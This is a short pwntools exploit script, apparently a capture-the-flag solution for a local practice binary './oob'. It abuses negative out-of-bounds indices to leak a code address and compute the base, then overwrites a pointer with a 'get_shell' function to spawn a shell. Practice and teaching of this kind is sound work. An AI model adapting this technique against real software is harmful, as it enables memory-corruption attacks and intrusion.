#!/usr/bin/python3

from pwn import *

context.binary = exe =ELF('./oob',checksec=False)

p=process(exe.path)

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'Index: ', b'-5')
p.sendlineafter(b'> ', b'4')
p.recvuntil(b'Name: ')
exe_leak = u64(p.recvline()[:-1] + b'\x00\x00')
exe.address = exe_leak - 13744
log.info("Exe lEak: " + hex(exe_leak))
log.info("Exe Base: " + hex(exe.address))


p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'Index: ', b'-9')
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'amount: ', str(exe.sym.get_shell).encode())
p.sendlineafter(b'> ', b'2')
p.sendline(b'ls -al')


p.interactive()
